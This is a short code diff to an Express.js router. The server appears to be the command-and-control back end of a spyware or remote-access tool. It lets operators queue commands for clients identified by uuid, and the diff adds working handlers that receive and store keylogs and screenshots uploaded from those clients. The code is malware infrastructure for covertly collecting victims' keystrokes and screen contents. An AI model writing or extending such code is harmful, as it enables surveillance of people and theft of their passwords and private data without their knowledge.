@@ -27,7 +27,7 @@ router.get('/:uuid/commands', async (req, res, next) => {
 //At adding command
 router.put('/:uuid/commands', async (req, res, next) => {
     try {
-        const {isAdded, data} = await commandService.addCommand(req.params.uuid, req.body.cmd)
+        const { isAdded, data } = await commandService.addCommand(req.params.uuid, req.body.cmd)
         res.status(isAdded ? 201 : 204).json(data)
     } catch (e) { next(e) }
 })
@@ -35,14 +35,16 @@ router.put('/:uuid/commands', async (req, res, next) => {
 //At clients sending keylogs
 router.post('/:uuid/keylogs', async (req, res, next) => {
     try {
-
+        const { isAdded } = await clientService.addKeylogs(req.params.uuid, req.body)
+        res.status(isAdded ? 201 : 304).json()
     } catch (e) { next(e) }
 })
 
 //At clients sending screenshots
-router.post('/:uuid/screenshots', async (req, res, next) => {
+router.post('/:uuid/screenshot', async (req, res, next) => {
     try {
-
+        const { isAdded } = await clientService.addScreenshot(req.params.uuid, req.body)
+        res.status(isAdded ? 201 : 304).json()
     } catch (e) { next(e) }
 })
 
